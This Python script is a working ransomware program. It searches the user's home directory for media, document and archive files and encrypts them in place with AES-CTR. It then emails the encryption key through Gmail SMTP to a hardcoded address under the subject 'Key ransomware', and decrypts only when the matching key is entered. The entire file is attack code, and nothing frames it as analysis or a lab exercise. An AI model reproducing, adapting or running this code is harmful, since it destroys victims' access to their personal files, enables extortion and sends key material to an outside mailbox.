import os
import socket
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

extensions = ['.mp3', '.mp4', '.avi', '.txt', '.jpeg', '.jpg', '.zip', '.rar', '.dat', '.doc', '.docx', '.xls', '.xlsl', '.csv', '.deb']
home = os.environ['HOME']
folders = os.listdir(home)
folders = [x for x in folders if not x.startswith('.')]


def send_key():
    msg = MIMEMultipart()
    email = 'programming.fadn@gmail.com'
    password = 'passwordhere'
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Key ransomware'
    msg.attach(MIMEText(file('key_file').read()))
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(email, password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:
        pass


def encrypt_and_decrypt(archive, crypto, block_size=16):
    with open(archive, 'r+b') as arch_enc:
        unencypt_content = arch_enc.read(block_size)
        while unencypt_content:
            encrypt_content = crypto(unencypt_content)
            if len(encrypt_content) != len(unencypt_content):
                raise ValueError('')
            
            arch_enc.seek(-len(unencypt_content), 1)
            arch_enc.write(encrypt_content)
            unencypt_content = arch_enc.read(block_size)

def check_internet_conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('socket.io', 80))
        # print('connected')
        s.close()
    except:
        exit()

def get_hash():
    hashcomputer = home + os.environ['USER'] + socket.gethostname() + str(random.randint(0, 100000000000000000000000000000000000000000000000000000))
    hashcomputer = hashlib.sha512(hashcomputer)
    hashcomputer = hashcomputer.hexdigest()

    new_key = []
    for k in hashcomputer:
        if len(new_key) == 32:
            hashcomputer = ''.join(new_key)
            break
        else:
            new_key.append(k)

    return hashcomputer

def discover(key):
    file_list = open('file_list', 'w+')
    for folder in folders:
        path = home + '/' + folder
        for ext in extensions:
            for pathabs, directory, arch in os.walk(path):
                for f in arch:
                    if f.endswith(ext):
                        file_list.write(os.path.join(pathabs, f) + '\n')

    file_list.close()
    lst = open('file_list', 'r')
    lst = lst.read().split('\n')
    lst = [l for l in lst if not l == ""]

    

    if os.path.exists('key_file'):
        key_enter = raw_input('Key: ')
        key_file = open('key_file', 'r')
        key = key_file.read().split('\n')
        key = ''.join(key)

        if key_enter == key:
            c = Counter.new(128)
            crypto = AES.new(key, AES.MODE_CTR, counter=c)
            crypt_arch = crypto.decrypt
            for elem in lst:
                encrypt_and_decrypt(elem, crypt_arch)        
        
    else:
        c = Counter.new(128)
        crypto = AES.new(key, AES.MODE_CTR, counter=c)
        key_file = open('key_file', 'w+')
        key_file.write(key)
        key_file.close()
        crypt_arch = crypto.encrypt
        send_key()
        for elem in lst:
            encrypt_and_decrypt(elem, crypt_arch)

    

    '''key_file = open('key_file', 'w+')
    key_file.write(key)
    key_file.close()'''

def main():
    check_internet_conn()
    hashcomputer = get_hash()
    discover(hashcomputer)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()